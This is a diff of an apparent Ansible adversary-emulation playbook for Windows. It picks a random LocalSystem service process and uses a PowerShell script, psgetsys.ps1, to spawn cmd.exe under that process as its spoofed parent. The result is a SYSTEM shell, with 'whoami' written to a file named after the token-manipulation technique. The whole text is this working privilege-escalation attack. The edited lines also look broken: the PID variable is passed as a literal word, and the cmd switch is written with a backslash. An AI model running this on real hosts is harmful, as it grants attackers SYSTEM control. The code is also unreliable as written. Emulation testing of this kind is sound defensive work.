@@ -8,8 +8,11 @@
     - name: Get running random PID running as system
       win_shell: |
         Get-WMIObject -Query "Select ProcessId From Win32_Service WHERE state='Running' and StartName='LocalSystem'" | findstr ProcessId | %{$_.split(':')[1]} | Sort-Object -Unique | Get-Random
-      register: systemPID   
+      register: systemPID
+      
+    - set_fact: 
+        pid={{ systemPID.stdout }}
       
     - name: Execute elevation powershell script
       win_shell: |
-        c:\temp\psgetsys.ps1; [MyProcess]::CreateProcessFromParent((Get-Process systemPID.stdout).Id,"cmd.exe")
+        c:\temp\psgetsys.ps1; [MyProcess]::CreateProcessFromParent((Get-Process pid).Id,"cmd.exe \k whoami > c:\temp\t1134.txt")
